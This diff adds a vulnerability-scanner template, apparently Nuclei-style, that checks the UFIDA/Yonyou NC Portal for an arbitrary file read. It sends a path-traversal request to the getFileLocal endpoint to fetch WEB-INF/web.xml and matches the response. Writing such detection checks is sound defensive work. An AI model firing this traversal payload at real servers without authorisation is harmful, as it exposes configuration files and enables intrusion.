@@ -1,0 +1,25 @@
+id: yonyou-ufida-nc-lfi
+brief:
+    title: UFIDA NC Portal - Arbitrary File Read
+    by: DhiyaneshDk
+    level: high
+    about: There is any file reading in the getFileLocal interface of UFIDA Mobile System Management.
+    label:
+        - yonyou
+        - ufida
+        - lfi
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/portal/file?cmd=getFileLocal&fileid=..%2F..%2F..%2F..%2Fwebapps/nc_web/WEB-INF/web.xml'
+      signs:
+        - "on": word
+          has:
+            - nc.bs.framework.server.WebApplicationStartupHook
+            - <web-app
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
